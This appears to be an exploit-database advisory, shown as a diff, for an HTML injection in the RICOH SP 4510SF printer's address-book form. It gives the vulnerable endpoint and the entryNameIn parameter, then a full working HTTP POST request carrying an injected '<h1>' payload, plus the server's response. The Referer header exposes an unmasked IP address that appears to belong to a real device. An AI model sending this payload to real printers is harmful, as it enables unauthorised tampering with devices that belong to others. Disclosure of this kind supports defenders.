@@ -1,0 +1,47 @@
+# Exploit Title: RICOH SP 4510SF Printer - HTML Injection
+# Date: 2019-05-06 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.ricoh.com/
+# Hardware Link: http://support.ricoh.com/bb/html/dr_ut_e/re1/model/sp4510/sp4510.htm
+# Software: RICOH Printer
+# Product Version: SP 4510SF
+# Vulernability Type: Code Injection
+# Vulenrability: HTML Injection
+# CVE: N/A
+
+# Description :
+# An HTML Injection vulnerability has been discovered on the RICOH SP 4510SF 
+# via the /web/entry/en/address/adrsSetUserWizard.cgi entryNameIn parameter.
+
+
+# HTTP POST Request :
+
+POST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1
+Host: XXX.XXX.XXX.XXX
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 218
+Origin: http://XXX.XXX.XX.XXX
+Connection: close
+Referer: http://189.72.192.16/web/entry/en/address/adrsList.cgi
+Cookie: risessionid=058916016024825; cookieOnOffChecker=on; wimsesid=314062051
+
+mode=ADDUSER&step=BASE&wimToken=1273767750&entryIndexIn=00001&entryNameIn=%22%3E%3Ch1%3Eismailtasdelen&entryDisplayNameIn=%22%3E%3Ch1%3Eismailtasdelen&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1
+
+# HTTP Response :
+
+HTTP/1.1 200 OK
+Date: Fri, 20 Dec 2019 07:59:19 GMT
+Server: Web-Server/3.0
+Content-Type: text/html; charset=UTF-8
+Expires: Fri, 20 Dec 2019 07:59:19 GMT
+Pragma: no-cache
+Cache-Control: no-cache
+Set-Cookie: cookieOnOffChecker=on; path=/
+Connection: close
+
+[14]
